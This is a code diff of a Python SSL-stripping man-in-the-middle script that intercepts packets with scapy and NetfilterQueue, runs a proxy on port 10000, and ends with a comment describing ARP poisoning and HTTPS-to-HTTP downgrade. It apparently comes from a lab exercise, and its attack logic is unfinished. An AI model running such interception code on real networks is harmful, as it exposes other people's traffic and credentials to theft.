@@ -1,9 +1,10 @@
 from scapy.all import *
 import re 
 import os  
-import socket
 from netfilterqueue import NetfilterQueue
 from threading import Thread
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+from SocketServer import ThreadingMixIn
 
 # process intercepted packets
 def process_traffic(packet):
@@ -13,7 +14,7 @@ def process_traffic(packet):
     print("Packet intercepted: ")
     print(p.show())
 
-    # Check if the packet has a Raw layer, where the HTTP messege is located
+    # Check if the packet has a Raw layer, where the HTTP message is located
     # so check if payload of the packet contains HTTP data
     if p.haslayer(Raw):
 
@@ -42,42 +43,10 @@ def process_traffic(packet):
             del p[IP].chksum
             del p[TCP].chksum
             # convert scapy packet to a regular packet
-            packet.set_payload(bytes(p))
+            packet.set_payload(str(p))
 
     # accept the packet and forward it to its destination
     packet.accept()
-
-
-
-def start_proxy():
-    # Create a socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Bind the socket to port 10000
-    s.bind(('0.0.0.0', 10000))
-
-    # Listen for incoming connections
-    s.listen(1)
-
-    while True:
-        # Accept a connection
-        conn, addr = s.accept()
-
-        # Handle the connection
-        handle_connection(conn)
-
-def handle_connection(conn):
-    # Receive data from the client
-    data = conn.recv(1024)
-
-    # Modify the data as necessary for the SSLStrip attack
-
-    # Send the modified data to the server
-
-    # Close the connection
-    conn.close()
-
-
 
 # start SSL stripping attack
 def ssl_strip(interface):
@@ -91,5 +60,38 @@ def ssl_strip(interface):
     queue.bind(0, process_traffic)
     queue.run()
 
-if __name__ == "__main__":
-    ssl_strip()
+# Start a simple HTTP server to handle the redirected traffic
+def start_proxy():
+    server_address = ('', 10000)
+    httpd = ThreadedHTTPServer(server_address, BaseHTTPRequestHandler)
+    httpd.serve_forever()
+
+# Handle the incoming connection
+def handle_connection(conn, addr):
+    data = conn.recv(1024)
+    print("Received data: ", data)
+
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    """Handle requests in a separate thread."""
+
+
+'''
+M1 sends a request to M2. This could be an HTTP or HTTPS request.
+
+Because of the ARP poisoning attack set up by M3, the request from M1 to M2 is intercepted by M3.
+
+M3 has set up a rule in its IP tables to redirect all HTTP traffic (traffic on port 80) to port 10000, where the proxy server is listening.
+
+The proxy server receives the redirected request and processes it. If the request is an HTTP request, the Accept-Encoding header is removed. If the request is an HTTPS request, the Location header is modified to downgrade the request to HTTP.
+
+The proxy server then forwards the modified request to M2.
+
+M2 responds to the request and sends the response back to M1. This response is also intercepted by M3 and redirected to the proxy server.
+
+The proxy server receives the redirected response and processes it. If the response is an HTTP response, the Content-Encoding header is removed. If the response is an HTTPS response, the Location header is modified to downgrade the response to HTTP.
+
+The proxy server then forwards the modified response to M1.
+
+M1 receives the modified response thinking it came directly from M2.
+
+'''
